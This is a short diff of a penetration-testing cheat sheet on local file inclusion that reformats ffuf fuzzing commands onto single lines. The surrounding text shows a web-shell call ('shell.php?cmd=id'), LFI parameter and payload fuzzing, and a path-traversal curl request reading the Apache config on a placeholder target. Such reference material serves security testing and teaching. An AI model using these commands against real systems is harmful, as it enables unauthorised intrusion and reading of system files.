@@ -533,9 +533,7 @@ curl "http://target.com/shell.php?cmd=id"
 
 ```bash
 # Find vulnerable params
-ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-     -u 'http://target.com/?FUZZ=value' \
-     -fs 2287
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://target.com/?FUZZ=value' -fs 2287
 
 # Common params to try
 ?file= ?page= ?lang= ?language= ?dir= ?path= ?module= ?include= ?doc= ?template=
@@ -545,9 +543,7 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ 
 
 ```bash
 # LFI wordlist
-ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
-     -u 'http://target.com/?language=FUZZ' \
-     -fs 2287 -mc 200
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://target.com/?language=FUZZ' -fs 2287 -mc 200
 ```
 
 **Wordlists:**  
@@ -558,9 +554,7 @@ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
 
 ```bash
 # Linux webroots
-ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
-     -u 'http://target.com/?file=../../../../FUZZ/index.php' \
-     -fs 2287
+ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://target.com/?file=../../../../FUZZ/index.php' -fs 2287
 
 # Manual check
 curl http://target.com/?file=../../../../etc/apache2/apache2.conf
